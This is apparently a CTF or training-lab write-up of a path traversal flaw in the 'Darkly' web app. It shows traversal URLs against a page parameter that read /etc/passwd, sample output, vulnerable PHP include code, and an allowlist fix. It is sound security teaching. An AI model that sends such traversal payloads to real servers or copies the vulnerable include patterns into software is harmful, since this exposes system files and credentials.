# Path Traversal

## Summary

This breach is located in the page loading mechanism of the Darkly web application.

The application uses a URL parameter to decide which page or file to load. By injecting path traversal sequences such as:

```txt
../
```

an attacker can move outside the intended web directory and try to read files from the server filesystem.

The target file used for the proof was:

```txt
/etc/passwd
```

Final flag:

```txt
Flag: PUT_THE_FLAG_HERE
```

## How I Discovered It

The website uses a `page` parameter in URLs:

```txt
index.php?page=home
index.php?page=member
index.php?page=survey
```

This suggests that the backend may use the value of `page` to include or load a file.

If the application does not validate this value correctly, an attacker can replace the expected page name with a filesystem path.

I tested traversal sequences such as:

```txt
../
../../
../../../
```

and targeted a known Linux file:

```txt
/etc/passwd
```

## Exploitation Approach

The goal was to escape the intended directory and reach `/etc/passwd`.

Example payload:

```txt
http://192.168.56.101/index.php?page=../etc/passwd
```

If one `../` is not enough, more traversal levels can be added:

```txt
http://192.168.56.101/index.php?page=../../etc/passwd
```

```txt
http://192.168.56.101/index.php?page=../../../etc/passwd
```

When the application reads the file, the response contains entries from `/etc/passwd`, for example:

```txt
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
```

In Darkly, successfully reaching the intended file traversal condition reveals the flag.

## Why `/etc/passwd`

`/etc/passwd` is commonly used to test local file inclusion or path traversal on Linux systems because it usually exists and is readable by normal users.

It does not usually contain password hashes on modern systems, but it proves that the application can read files outside the intended web directory.

## Why This Is Vulnerable

The application trusts user-controlled input to build a file path.

A vulnerable backend may do something like:

```php
include($_GET["page"]);
```

or:

```php
readfile("pages/" . $_GET["page"]);
```

If the input is:

```txt
../etc/passwd
```

the final resolved path may point outside the intended folder.

The problem is that the server treats user input as part of a filesystem path without strict validation.

## Impact

An attacker may be able to read sensitive local files from the server.

Depending on permissions and implementation, this could expose:

- system files
- application source code
- configuration files
- database credentials
- logs
- secret keys

If the vulnerability is a file include instead of only file read, it may sometimes lead to remote code execution.

## How To Prevent It

Recommended fixes:

- Do not use raw user input as a file path.
- Use an allowlist of valid page names.
- Map page identifiers to fixed server-side files.
- Reject input containing `../`, absolute paths, null bytes, or path separators.
- Resolve paths with `realpath` and verify they stay inside the intended directory.
- Disable remote file includes.
- Configure filesystem permissions with least privilege.

Safer design:

```php
$allowedPages = [
    "home" => "pages/home.php",
    "member" => "pages/member.php",
    "survey" => "pages/survey.php",
];

$page = $_GET["page"] ?? "home";

if (!array_key_exists($page, $allowedPages)) {
    http_response_code(404);
    exit("Page not found");
}

include $allowedPages[$page];
```

The main lesson is:

```txt
Never let the user directly control filesystem paths. Use an allowlist and verify resolved paths server-side.
```
